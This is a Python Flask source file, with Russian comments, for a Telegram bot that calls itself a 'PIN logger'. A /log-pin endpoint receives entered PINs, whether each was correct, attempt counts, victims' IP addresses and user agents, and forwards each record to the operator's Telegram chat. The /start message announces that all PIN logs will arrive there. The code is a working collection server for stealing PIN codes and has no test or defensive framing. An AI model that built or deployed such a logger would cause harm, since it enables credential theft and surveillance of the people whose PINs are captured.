from flask import Flask, request, jsonify
import requests
import os
from datetime import datetime

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

print(f"[{datetime.utcnow()}] Bot started | BOT_TOKEN: {'SET' if BOT_TOKEN else 'MISSING'} | CHAT_ID: {CHAT_ID}")

# ====================== ОСНОВНОЙ WEBHOOK ======================
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.get_json(silent=True)
        
        if not update or 'message' not in update:
            return jsonify({"ok": True}), 200

        msg = update['message']
        chat_id = msg['chat']['id']
        text = msg.get('text', '').strip().lower()

        print(f"[{datetime.utcnow()}] Received from {chat_id}: {text}")

        if text in ['/start', '/start@' + (os.environ.get('BOT_USERNAME') or '')]:
            response_text = f"""👋 <b>Пин-логгер бот успешно запущен!</b>

✅ Webhook работает
🕒 Время сервера: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
📍 Все логи PIN будут приходить сюда

Напишите /help для команд."""
        
        elif text == '/help':
            response_text = """📋 Доступные команды:

/start — проверка работы бота
/help — это сообщение
/status — статус бота"""

        elif text == '/status':
            response_text = f"""📊 Статус:
🟢 Бот онлайн
🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
📍 Логи идут в чат: {CHAT_ID}"""
        else:
            response_text = "Неизвестная команда. Напишите /help"

        # Отправляем ответ пользователю
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": response_text,
                "parse_mode": "HTML"
            },
            timeout=10
        )

        return jsonify({"ok": True}), 200

    except Exception as e:
        print(f"ERROR in webhook: {e}")
        return jsonify({"ok": True}), 200   # Telegram требует 200 OK всегда


# ====================== ЛОГИРОВАНИЕ PIN ======================
@app.route('/log-pin', methods=['POST'])
def log_pin():
    try:
        data = request.get_json(silent=True) or {}
        print(f"[{datetime.utcnow()}] PIN attempt received: {data.get('entered_pin')} | success: {data.get('success')}")

        # Здесь можно оставить твой старый красивый код отправки лога в CHAT_ID
        if CHAT_ID:
            status = "✅ Успешно" if data.get('success') else "❌ Неверно"
            message = f"""🔒 ПИН-попытка

{status}
PIN: <code>{data.get('entered_pin', '—')}</code>
Попыток: {data.get('attempts', 0)}
IP: <code>{data.get('ip', '—')}</code>
UA: <code>{str(data.get('user_agent', ''))[:100]}</code>"""

            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
                timeout=10
            )
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in /log-pin: {e}")
        return jsonify({"status": "error"}), 500


@app.route('/')
def home():
    return """
    <h1>✅ Pin Logger Bot is running</h1>
    <p>Webhook: /webhook (active)</p>
    <p>Log endpoint: /log-pin</p>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
